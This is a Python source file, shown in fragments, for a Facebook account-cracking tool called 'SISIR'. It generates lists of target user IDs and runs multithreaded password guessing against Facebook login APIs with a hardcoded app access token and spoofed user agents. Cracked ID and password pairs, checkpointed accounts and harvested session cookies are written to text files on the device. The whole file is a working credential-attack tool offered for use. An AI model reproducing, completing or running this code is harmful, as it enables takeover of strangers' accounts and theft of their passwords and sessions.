...
logo=("""\033[1;91m
\033[1;35m╔═╗╦╔═╗╦╦═╗
\033[1;35m╚═╗║╚═╗║╠╦╝     \033[1;33mIn the ages of hero,
\033[1;35m╚═╝╩╚═╝╩╩╚═      \033[1;33mSisir chosed to become a villain.
\033[1;38m--------------------------------------------------
 [\033[1;32m*\033[1;37m] Author   : SISIR_BEB
 [\033[1;32m*\033[1;37m] Facebook : Shaddy Sisir
 [\033[1;32m*\033[1;37m] Tool     : Trial
 [\033[1;32m*\033[1;37m] Version  : 0.0.9
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVED IN:\033[1;32m/sdcard/SISIR-OK.txt\033[1;37m
\033[1;37m--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/sisirrhu')
			if xd in ['1','01']:
				clear()
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as SISIR:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					SISIR.submit(SISIR4,ids,passlist)
...
def gmail():
		...
		clear()
		print('\033[1;37m example: nepal, ram, hari, prasad\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: khan, gurung, magar \033[1;97m')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [SISIR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [SISIR-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/SISIR-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [SISIR-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/SISIR-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/SISIR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SISIR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/SISIR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SISIR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SISIR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
#method4
def SISIR4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SISIR-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SISIR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/SISIR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SISIR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [SISIR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SISIR-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
